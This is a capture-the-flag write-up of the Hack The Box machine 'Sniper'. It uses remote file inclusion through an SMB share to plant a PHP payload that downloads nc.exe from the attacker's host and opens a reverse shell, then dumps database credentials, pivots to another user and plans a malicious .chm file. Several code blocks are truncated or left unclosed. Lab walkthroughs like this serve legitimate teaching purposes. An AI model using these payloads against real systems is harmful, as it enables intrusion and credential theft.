# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.151 sniper.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC sniper.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 11:11 EDT

# Enumeration (1)

Port 80 seems like a good place to start.

![](/assets/images/sniper1.png) 

There was a login and a registration page:

`/user/login.php and /user/registration.php`

![](/assets/images/sniper2.png) 


We can register a new account and login with it but to be only presented with this :(

`/user/index.php`

![](/assets/images/sniper3.png) 


There was also a blog page:

`/blog/index.php`

![](/assets/images/sniper4.png) 

But then when we view it in other languages by clicking on the options in the "Language" dropdown menu:

![](/assets/images/sniper5.png) 

We see that it is trying to include other `.php` files for different languages! Maybe we can do some local file inclusion (LFI)?

![](/assets/images/sniper6.png) 

I tried setting `?lang=index.php`, only to realise that it would cause the server to recursively include `index.php` endlessly. Hence, we know that LFI is possible here.

# Exploitation (1)

I tried many LFI techniques seen [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) but most of them didn't work. It was as if there was some validation going on to prevent LFI. 

That was when I was thinking: hmm... this is a Windows box right? What happens if we try to include a file in a `SMB` share? That was when I saw this in the same link:

![](/assets/images/sniper7.png) 

Lets test out this theory.

First, I create a new folder on my Desktop:
{% highlight bash %}
$ mkdir ~/Desktop/fileshare
{% endhighlight %}

And then configured my `Samba` config to create a new `SMB` share called `public`:
{% highlight bash %}
$ cat /etc/samba/smb.conf
...
[public]:
	force user = nobody
	path = /root/Desktop/fileshare
	public = yes
{% endhighlight %}

With that done, I create a `.php` file in it :
{% highlight bash %}
$ cat /root/Desktop/fileshare/phpinfo.php
<?php phpinfo(); ?>
{% endhighlight %}

And start my `smbd` service:
{% highlight bash %}
$ systemctl start smbd
{% endhighlight %}

Now if we browse to `/blog/?lang=\\10.10.XX.XX\public\phpinfo.php`:

![](/assets/images/sniper8.png)

We have successfully upgraded from LFI to remote file inclusion (RFI) :)

Nows lets try to establish a reverse shell back to us. Since `PHP` reverse shells are sometimes a little wonky , I'm going to upload a `nc.exe` and use it to connecting back to our listener.

Starting a webserver:
{% highlight bash %}
$ mkdir ~/Desktop/web
$ cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
{% endhighlight %}

Creating a `.php` file to download `nc.exe` and connect back to us:
{% highlight bash %}
$ cat /root/Desktop/fileshare/rev.php
<?php
# Create a temp dir
system("mkdir C:\\tmp");
# Download nc.exe
system("curl http://10.10.XX.XX/nc.exe > C:\\tmp\\nc.exe");
# Establish reverse shell
system("C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337");
?>
{% endhighlight %}

Starting our listener:
{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
{% endhighlight %}

Triggering our `.php` script and getting a shell:
{% highlight bash %}
$ curl 'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\shell.php'
{% endhighlight %}

{% highlight raw %}

# Enumeration (2)

Listing local users:
{% highlight raw %}
C:\inetpub\wwwroot\blog>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Chris                    DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed with one or more errors.
{% endhighlight %}

Seems like the `user.txt` is residing in `Chris` but we do not know his credentials.

Looking around, I found MySQL credentials in `C:\inetpub\wwwroot\users`:
{% highlight raw %}
C:\inetpub\wwwroot\user>type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
{% endhighlight %}

and also saw how the `login` feature for the website was implemented:
{% highlight raw %}
<?php
require('db.php');
session_start();
// If form submitted, insert values into the database.
if (isset($_POST['username'])){
        // removes backslashes
        $username = stripslashes($_REQUEST['username']);
        //escapes special characters in a string
        $username = mysqli_real_escape_string($con,$username);
        $password = stripslashes($_REQUEST['password']);
        $password = mysqli_real_escape_string($con,$password);
        //Checking is user existing in the database or not
        $query = "SELECT * FROM `users` WHERE username='$username'
and password='".md5($password)."'";
        $result = mysqli_query($con,$query) or die(mysql_error());
        $rows = mysqli_num_rows($result);
        if($rows==1){
            $_SESSION['username'] = $username;
            // Redirect user to index.php
            header("Location: index.php");
         }else{
...
{% endhighlight %}

From this, we can tell that some possible usernames and passwords are stored in the `users` table in the columns `username` and `password` so lets try to dump them out:

Creating a `.php` file to dump out the `users` table:
{% highlight bash %}
$ cat ~/Desktop/fileshare/dump.php
<?php
$conn = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
$sql = "SELECT * from users";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result)) {
        print_r($row);
    }
} else {
    echo "0 results";
}
mysqli_close($conn);
?>
{% endhighlight %}

Viewing the results:
{% highlight bash %}
$ curl 'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\dump.php'
...
Array
(
    [id] => 1
    [username] => superuser
    [email] => admin@sniper.co
    [password] => 6e573c8b25e9168e0c61895d821a3d57
    [trn_date] => 2019-04-11 22:45:36
)
...
{% endhighlight %}

Putting the hash into Google (Yes Google), turns out it was the MD5 hash of `$uperpassw0rd`.

Using `smbmap`, I decided to manually test possible pairs of credentials since the password list was short:
{% highlight bash %}
smbmap -H sniper.htb -u Chris -p "$uperpassw0rd"
[+] Finding open SMB ports....
[!] Authentication error on sniper.htb

        C$                                                      NO ACCESS       Default share
		...
        IPC$                                                    READ ONLY       Remote IPC
{% endhighlight %}

Alright, we got Chris's credentials. To login into `Chris`, we will need to do something like a `su` or `sudo` in Linux but for Windows! In Powershell, there is a cmdlet called [`Invoke-Command`](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7) which allows you to specify who to run as using `-Credential` or `-Session`.

Testing `Invoke-Command`:
{% highlight raw %}

PS C:\inetpub\wwwroot\blog> Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami}

{% endhighlight %}

It works! We were able to run commands as `chris`! Now lets try to establish another reverse shell as `chris`.

Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

It is possible that the CEO is retrieving the file and opening it. Using `nishang`'s [`Out-CHM.ps1`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1), we can actually generate a malicious `.chm` that run arbitrary commands.

# root.txt

First we will need to install [`HTML Help Workshop`](https://www.microsoft.com/en-sg/download/details.aspx?id=21138).

![](/assets/images/sniper10.png) 

After some testing on my local machines, I managed to generate the correct `.chm` file:

{% highlight powershell %}

After transfering the `doc.chm` to my Kali's web server directory, I uploaded it to `C:\Docs` as `instructions.chm`.
